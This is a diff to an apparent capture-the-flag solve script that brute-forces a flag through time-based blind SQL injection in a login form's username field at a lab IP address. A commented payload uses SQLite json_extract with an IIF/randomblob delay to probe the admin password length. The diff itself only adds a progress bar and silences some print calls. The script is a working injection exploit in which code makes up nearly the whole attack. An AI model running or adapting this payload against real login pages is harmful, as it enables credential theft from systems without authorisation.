@@ -1,12 +1,13 @@
 from requests import *
 from string import *
+from tqdm import *
 
 
 strings = ascii_letters + digits + punctuation
 url = "http://10.113.184.121:10081/login"
 
 flag = ""
-for i in range(27):
+for i in trange(27):
     if i == 26:
         flag += "}"
         break
@@ -16,12 +17,12 @@ for i in range(27):
 
             # payload = "admin.username\") as a,   json_extract(users, '$.admin.username') as b,   json_extract(users, '$.admin.password') as c FROM db  WHERE    b = 'admin'    AND IIF(length(c) = 27, (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # "
             
-            print(payload)
+            # print(payload)
 
             try:
                 r = post(url=url, data={"username" : payload, "password" : "guest"})
             except:
                 flag += string
-                print(flag)
+                # print(flag)
                 break
 print(flag)
